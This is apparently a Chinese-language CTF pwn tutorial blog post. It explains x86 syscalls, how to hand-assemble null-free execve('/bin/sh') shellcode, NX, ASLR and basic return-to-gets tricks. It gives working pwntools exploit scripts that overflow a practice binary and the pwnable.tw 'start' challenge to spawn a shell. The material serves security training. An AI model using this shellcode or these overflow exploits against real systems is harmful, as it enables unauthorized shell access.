---
title: PWN入门（三）
date: 2018-07-11 08:50:39
tags: [ctf, pwn]
---

Shellcode's Magic&Basic ROP.

<!-- more -->

shellcode 是一段用于利用软件漏洞而执行的代码，以其经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。

# 系统调用（int 0x80）

|     NAME     | EAX |       EBX        |      ECX       |   EDX    |
| :----------: | :-: | :--------------: | :------------: | :------: |
|  `sys_exit`  |  1  |      `int`       |       0        |    0     |
|  `sys_read`  |  3  |  `unsigned int`  |    `char *`    | `size_t` |
| `sys_write`  |  4  |  `unsigned int`  | `const_char *` | `size_t` |
|  `sys_open`  |  5  |  `const char *`  |      int       |  `int`   |
| `sys_execve` | 11  | `struct pt_regs` |       0        |    0     |

PS：最常用的为 11 号调用。也就是 `execve("/bin/sh",0,0)`。

# 编写 ShellCode

自己编写 shellcode 的优点是灵活、可以随机应变。

## 坏字符

Shellcode 中存在 0x00 字节在进行利用的时候会被截断。Shellcode 如果存储在堆或是栈的内存中，这样在 shellcode 执行时就不能出现 0x00 这样的阶段字符。

### `\x00`

在执行 `MOV EAX,5` 时，相当于 `MOV EAX,0x00000005`，即会产生 `0x00`，可以使用 `MOV AL,5` 来绕过

### `\x0A`

绕过可以通过 `!@#$%`。

## EBX 中的参数（`/bin/sh`）

一般做法是压入栈后取 ESP：

```nasm
PUSH 0x68732F2F
PUSH 0x6E69622F
MOV EBX,ESP
```

前两段十六进制转换成 ascii 码是：`hs//nib/`，取 ESP 的值到 EBX 中后，EBX 的值即为：字符串 `"/bin//sh"` 的首地址。

![](/pics/BIN集训/PWN/三/1.png)

PS：在多级目录下，多个斜杠是对路径没有影响的。

![](/pics/BIN集训/PWN/三/2.png)

## nasm 反汇编工具下载

Netwide Assembler 是一款基于英特尔 x86 架构的汇编与反汇编工具。它可以用来编写 16 位、32 位（IA-32）和 64 位（x86-64）的程序。 NASM 被认为是 Linux 平台上最受欢迎的汇编工具之一。

### `sudo apt-get install nasm` 报错

记录一下无法下载时的解决方法。

1. 使用 `ps -A | grep apt`命令来找出所有 `apt` 进程。
2. 使用 `sudo kill -9 {进程编号}` 来逐个杀死进程。

![](/pics/BIN集训/PWN/三/3.png)

结束所有进程后即可下载。

## 完整编写过程

写入文件 `shellcode.asm`：

```asm
Section .text
	global _start
_start:
	xor ecx,ecx
	mul ecx
	push ecx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	mov al,0xb
	int 0x80
```

PS：关于这两条指令：`XOR ECX,ECX => MUL ECX`，经过测试，会先将 ECX 中的值置零，然后 EAX、EDX 中的值也都会变为零。

![](/pics/BIN集训/PWN/三/4.png)

![](/pics/BIN集训/PWN/三/5.png)

执行命令：`nasm -f elf shellcode.asm -o shellcode.o` 后，使用 `objdump` 命令对 `shellcode.o` 进行反汇编：`objdump -d shellcode.o`。

![](/pics/BIN集训/PWN/三/6.png)

将十六进制部分记录下来，就构成了一条 shellcode：`\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80`。

# ROP

面向返回编程（Return-Oriented Programming）是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为 Gadgets）。每一段 gadget 通常结束于 return 指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。

## 相关保护机制

NX 即 No-eXecute（不可执行）的意思，NX（类似于 windows 下的 DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。

PS：

- [x] No eXecute（NX） => linux
- [x] Data Execution Prevention（DEP） => windows

也就是说：“可执行不可写，可写不可执行。”

# ASLR

Address Space Layout Randomization（地址空间布局随机化），该技术在 2005 年的 kernel2.6.12 中被引入到 Linux 系统，它将进程的某些内存空间地址进行随机化来增大入侵者预测目的地址的难度，从而降低进程被成功入侵的风险。当前 Linux、Windows 等主流操作系统都已经采用该项技术。

分级：

- 0：没有随机化。即关闭 ASLR。
- 1：保留的随机化。共享库、栈、`mmap()` 以及 VDSO 将被随机化。
- 2：完全的随机化。在 1 的基础上，通过 `brk()` 分配的内存空间也将被随机化。

PS：

- [x] ASLR 并不负责 BSS 段、代码段（文本段）和数据段（DATA 段）的随机化。
- [x] 堆栈空间被完全随机化。

# 7-11

源码：

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void A()
{
	setvbuf(stdout, 0, _IONBF, 0);
	srand(time(0) ^ getpid());
	char buf[100];
	gets(buf);
	int magic = rand();
	if (atoi(buf) == magic) {
		puts("Okay...");
		system("sh");
	}
}
int main(){
	A();
}
```

这道题和之前的一题很类似，但是将 buf 和 magic 两个变量的位置进行了调换，所以无法通过直接覆盖 magic 的值来 getshell。（当然还有一种方法时直接获得 `system("sh");` 的地址来 getshell）

## 简单难度

此时 ASLR 是关闭的。

![](/pics/BIN集训/PWN/三/7.png)

基本的想法是先填入 shellcode，然后通过 ret 的偏移量来跳转到 shellcode 的首地址，执行 `execve("/bin/sh",0,0)` 来 getshell。

shellcode 在之前已经写好了，偏移量也可以通过之前缓冲区溢出的方法来得到。

![](/pics/BIN集训/PWN/三/8.png)

最后应该如何获得 shellcode 的首地址？可以通过如下 payload 来获取。

```python
# test.py
from pwn import *
p = process('./7-11')
raw_input() # 相当于设下断点
shellcode=p32(0xdeadbeef)+"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
addr=p32(0x12345678)
offset=116
payload=shellcode+(offset-len(shellcode))*'A'+addr
p.sendline(payload)
p.interactive()
```

这里在 shellcode 前加上“0xdeadbeef”，是为了之后在调试时更方便地找到首地址。`raw_input()` 要求输入值，可以使程序在运行时终止，相当于一个断点。

运行 test.py，会得到该程序的 PID，用 gdb 的 attach 命令执行它。

![](/pics/BIN集训/PWN/三/9.png)

在运行程序处随便输入值，然后在 gdb 中用 finish 命令使程序执行到 `gets()` 函数结束，再用 searchmem 命令查找“0xdeadbeef”的地址，即得到 shellcode 的首地址。

![](/pics/BIN集训/PWN/三/10.png)

最后的 exp 如下：

```python
# 7-11.py
from pwn import *
p = process('./7-11')
shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
addr=p32(0xffffcfa8)
offset=116
# payload=shellcode+(offset-len(shellcode))*'A'+addr
payload=shellcode.ljust(offset,'A')+addr
p.sendline(payload)
p.interactive()
```

## 中等难度

通过命令 `sudo sh -c "echo 2 > /proc/sys/kernel/randomize_va_space"`，打开 ASLR。

通过之前的了解，当 ASLR 开启时，堆栈的地址是随机的，而 BSS 的地址是不变的，那么通过 BSS 段可以做一些文章。

PS：BSS（Block Started by Symbol）通常是指用来存放程序中未初始化的全局变量和静态变量的一块内存区域。其特点是可读写，且在程序执行之前会自动清 0。

总体的思路是利用 BSS 段地址不变的特性，构造 payload：`payload=offset*'A'+p32(gets_addr)+p32(bss+0x100)+p32(bss+0x100)`（因为 BSS 段开头部分可能存储一些重要数据，故增加 0x100 来避免影响程序）。第一个 BSS 首地址表示 `gets()` 的返回地址，第二个 BSS 首地址表示 `gets()` 的参数。

那么通过 payload 可知，程序执行时会重新返回到 `gets()` 函数处，调用函数时，相当于先 `Push retaddr` 再 `Jump`，即第一个 BSS 首地址为函数返回地址，再输入 shellcode 作为函数参数，即第二个 BSS 首地址。

使用 gdb 对程序调试，用 vmmap 命令查看 bss 段：

![](/pics/BIN集训/PWN/三/11.png)

记录下 bss 段地址。通过 `objdump -d` 查看 `gets()` 函数地址：

![](/pics/BIN集训/PWN/三/12.png)

两个地址都搞定后，那么就可以写出 exp 了：

```python
from pwn import *
# p = remote('10.21.13.88',1025)
p = process('./7-11')
shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
offset=116
bss=0x0804a000
gets_addr=0x08048400
payload=offset*'A'+p32(gets_addr)+p32(bss+0x100)+p32(bss+0x100)
p.sendline(payload)
# gdb.attach(p,'''
# ''') //在运行脚本时可以直接打开gdb进行调试
p.sendline(shellcode)
p.interactive()
```

# pwnable.tw-start

checksec 一下，发现保护都没开：

```
[*] '/home/assassinq/Desktop/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

反编译出来只有 `_start` 和 `_exit`，应该是个汇编程序。可以通过[系统调用](http://syscalls.kernelgrok.com/)判断出调用的函数：

```asm
./start:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       54                      push   esp
 8048061:       68 9d 80 04 08          push   0x804809d
 8048066:       31 c0                   xor    eax,eax
 8048068:       31 db                   xor    ebx,ebx
 804806a:       31 c9                   xor    ecx,ecx
 804806c:       31 d2                   xor    edx,edx
 804806e:       68 43 54 46 3a          push   0x3a465443
 8048073:       68 74 68 65 20          push   0x20656874
 8048078:       68 61 72 74 20          push   0x20747261
 804807d:       68 73 20 73 74          push   0x74732073
 8048082:       68 4c 65 74 27          push   0x2774654c
 8048087:       89 e1                   mov    ecx,esp
 8048089:       b2 14                   mov    dl,0x14
 804808b:       b3 01                   mov    bl,0x1
 804808d:       b0 04                   mov    al,0x4 ; sys_write
 804808f:       cd 80                   int    0x80
 8048091:       31 db                   xor    ebx,ebx
 8048093:       b2 3c                   mov    dl,0x3c
 8048095:       b0 03                   mov    al,0x3 ; sys_read
 8048097:       cd 80                   int    0x80
 8048099:       83 c4 14                add    esp,0x14
 804809c:       c3                      ret

0804809d <_exit>:
 804809d:       5c                      pop    esp
 804809e:       31 c0                   xor    eax,eax
 80480a0:       40                      inc    eax
 80480a1:       cd 80                   int    0x80
```

具体寄存器的值与系统调用的关系：

| 寄存器 |     作用     |
| :----: | :----------: |
|  eax   |  中断类型号  |
|  ebx   | STDIN/STDOUT |
|  ecx   |  字符串地址  |
|  edx   |  字符串长度  |

因为栈是可执行的并且开启了 ASLR。我们的想法就是通过泄漏栈地址，然后填入 shellcode，跳转过去 getshell。

exp 如下：

```python
#!/usr/bin/env python
from pwn import *
local = 1
if local:
    p = process('./start')
else:
    p = remote('139.162.123.119', 10000)
write = 0x8048087
# gdb.attach(p)
offset = 20
payload = 'A' * offset + p32(write)
p.sendafter('CTF:', payload)
stack = u32(p.recv(4)) + 0x10
print 'stack:', hex(stack)
sh = open('sh.bin').read()
payload = 'A' * 20 + p32(stack + 4) + sh
p.send(payload)
p.interactive()
```

# 参考网站

https://linux.cn/article-8040-1.html
http://bestwing.me/2017/03/19/stack-overflow-two-ROP/
https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/
https://blog.csdn.net/white_eyes/article/details/7169199
https://b3t4m3ee.github.io/2018/07/10/Shellcode-s-Magic/
https://blog.csdn.net/Plus_RE/article/details/79199772
http://showlinkroom.me/2017/01/22/pwnable-tw/
